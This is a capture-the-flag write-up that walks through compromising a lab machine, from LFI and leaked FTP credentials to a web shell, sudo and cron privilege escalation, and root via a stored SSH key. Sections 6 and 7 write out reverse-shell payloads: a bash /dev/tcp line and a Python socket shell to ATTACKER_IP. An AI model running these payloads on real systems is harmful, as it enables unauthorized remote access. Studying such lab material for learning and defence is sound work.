# Watcher CTF — Writeup

## 1. Enumeration

First, I scanned the target:

```bash
nmap -sS -p- -T5 -sVC 10.114.190.157
```

Open ports:

| Port | Service | Version |
|---|---|---|
| 21 | FTP | vsftpd 3.0.5 |
| 22 | SSH | OpenSSH 8.2p1 |
| 80 | HTTP | Apache 2.4.41 / Jekyll |

The web server was running a Jekyll site called **Corkplacemats**.

---

## 2. Finding LFI

While checking the website, I found a **Local File Inclusion (LFI)** vulnerability.

I also enumerated directories:

```bash
gobuster dir -u "http://10.114.190.157/" \
-w /usr/share/wordlists/dirb/common.txt
```

This revealed:

```text
/robots.txt
```

Inside `robots.txt`, I found:

```text
/flag_1.txt
/secret_file_do_not_read.txt
```

Direct access to the secret file returned a permission error.

Because the website had LFI, I used it to read the file.

The file contained FTP credentials:

```text
ftpuser:givemefiles777
```

It also revealed the FTP directory:

```text
/home/ftpuser/ftp/files
```

---

## 3. FTP Access

I logged into FTP using the discovered credentials:

```bash
ftp 10.114.190.157
```

Credentials:

```text
Username: ftpuser
Password: givemefiles777
```

Inside the FTP server, I found:

```text
flag_2.txt
```

---

## 4. Getting a Web Shell

Because I could upload files to the FTP directory and the website had LFI, I uploaded a PHP web shell to:

```text
/home/ftpuser/ftp/files
```

Then I used the LFI vulnerability to include the uploaded file.

This gave me a shell on the target as:

```text
www-data
```

I then searched the system and found another flag:

```text
/var/www/html/more_secrets_a9f10a/flag_3.txt
```

---

## 5. Privilege Escalation: www-data → toby

I checked the sudo permissions:

```bash
sudo -l
```

The important result was:

```text
User www-data may run the following commands:
    (toby) NOPASSWD: ALL
```

This meant `www-data` could execute commands as `toby` without a password.

I obtained a shell as `toby`:

```bash
sudo -u toby /bin/bash
```

---

## 6. Privilege Escalation: toby → mat

As `toby`, I found a jobs directory containing a script:

```text
~/jobs/cow.sh
```

A note indicated that cron jobs were configured.

I added a reverse shell command to the script:

```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/1234 0>&1' >> cow.sh
```

I started a listener on my machine:

```bash
nc -lvnp 1234
```

When the cron job executed, I received a shell as:

```text
mat
```

---

## 7. Privilege Escalation: mat → will

As `mat`, I checked sudo permissions:

```bash
sudo -l
```

I found:

```text
User mat may run the following commands:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

This meant I could execute the Python script as `will`.

I inspected the scripts:

```bash
ls ~/scripts
```

Important files:

```text
cmd.py
will_script.py
```

I created a Python reverse shell payload in `cmd.py`:

```python
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",7777))
[os.dup2(s.fileno(),f) for f in (0,1,2)]
pty.spawn("/bin/sh")
```

I started a listener:

```bash
nc -lvnp 7777
```

Then executed the allowed script as `will`:

```bash
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py *
```

I received a shell as:

```text
will
```

I also found:

```text
flag_6.txt
```

in the `will` home directory.

---

## 8. Finding the SSH Private Key

During further enumeration, I found:

```text
/opt/backups/key.b64
```

The file contained a Base64-encoded RSA private key.

I decoded it:

```bash
base64 -d key.b64 > id_rsa
```

Then I secured the key:

```bash
chmod 600 id_rsa
```

The decoded file started with:

```text
-----BEGIN RSA PRIVATE KEY-----
```

---

## 9. Root Access

I tried using the private key for SSH:

```bash
ssh -i id_rsa root@10.114.190.157
```

The login succeeded and I obtained a root shell:

```text
root@ip-10-114-190-157:~#
```

This completed the privilege escalation path.

---

# Attack Chain

```text
Web Enumeration
      |
      v
LFI
      |
      v
Read secret file
      |
      v
FTP Credentials
      |
      v
FTP Access
      |
      v
Upload Web Shell
      |
      v
www-data
      |
      v
sudo → toby
      |
      v
Cron Job Abuse
      |
      v
mat
      |
      v
sudo → will
      |
      v
Python Script Abuse
      |
      v
will
      |
      v
Base64 SSH Key
      |
      v
SSH as root
      |
      v
ROOT
```

# Key Vulnerabilities

- Local File Inclusion (LFI)
- Sensitive information disclosure
- Weak FTP credentials
- Dangerous file upload combined with LFI
- Overly permissive `sudo` configuration
- Writable/abusable cron job
- Unsafe Python script execution through `sudo`
- Private SSH key stored insecurely
- Base64 encoding used as if it were protection

# Lessons Learned

1. Always enumerate web applications and common files such as `robots.txt`.
2. LFI can sometimes be chained with file upload functionality to obtain code execution.
3. Credentials should never be stored in publicly readable files.
4. `sudo` permissions should follow the principle of least privilege.
5. Cron scripts must not be writable by unprivileged users.
6. Scripts executed with `sudo` should be carefully reviewed for command/code injection.
7. Private SSH keys must be protected and should never be stored in insecure backup locations.
8. Base64 is encoding, not encryption.
